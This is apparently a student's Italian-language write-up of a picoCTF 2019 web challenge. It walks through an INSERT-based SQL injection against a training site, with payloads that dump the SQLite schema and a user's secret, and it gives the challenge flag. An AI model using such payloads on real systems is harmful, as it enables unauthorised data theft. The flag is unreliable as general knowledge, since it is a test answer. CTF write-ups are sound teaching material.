---
tags:
  - WebExploitation
  - PicoCTF2019
---


## Problema 

Psst, Agent 513, now that you're an employee of Evil Empire Co., try to get their secrets off the company website. [link](https://2019shell1.picoctf.com/problem/12234/) Can you first find the secret code they assigned to you? or http://2019shell1.picoctf.com:12234

## Soluzione

Provo il form di registrazione, metto apice `'` ma nulla; probabilmente non è attaccabile.
Provo a mettere l'apice `'` per l'inserimento di un nuovo TODO e ottengo un 500 internal server error: ok, il campo è debole a injection.
In particolare visto che sto inserendo un nuovo valore sarà una INSERT injection, l'obiettivo sarà scrivere nella lista dei TODO il risultato di una query.
Immagino che il server effettui una query analoga a:
```sql
INSERT INTO todo VALUES (1, 'foo', '{0}')
```
Devo modificare il `{0}` in modo che fornisca una query valida ma iniettandoci il risultato di una altra query.
Dopo qualche tentativo inserisco:
```sql
' || (SELECT 1) || '
```
e vedo che tra i TODO vi è il valore "1". Ci siamo!
Provo a capire lo schema del database, per farlo cerco di capire che DBMS sto utilizzando, alla fine trovo una query funzionante:
```sql
' || (SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1) || '
```
Questa query fornisce:
```sql
CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name VARCHAR(128), password_hash VARCHAR(128), secret VARCHAR(128), admin INTEGER, PRIMARY KEY (id) )
```
Dopo qualche tentativo provo a vedere quale è il secret associato al mio utente con 
```sql
' || (SELECT secret FROM user WHERE username  = 'qqq' LIMIT 1) || '
```
e ottengo il CTF!
```
picoCTF{wh00t_it_a_sql_inject46527b2c}
```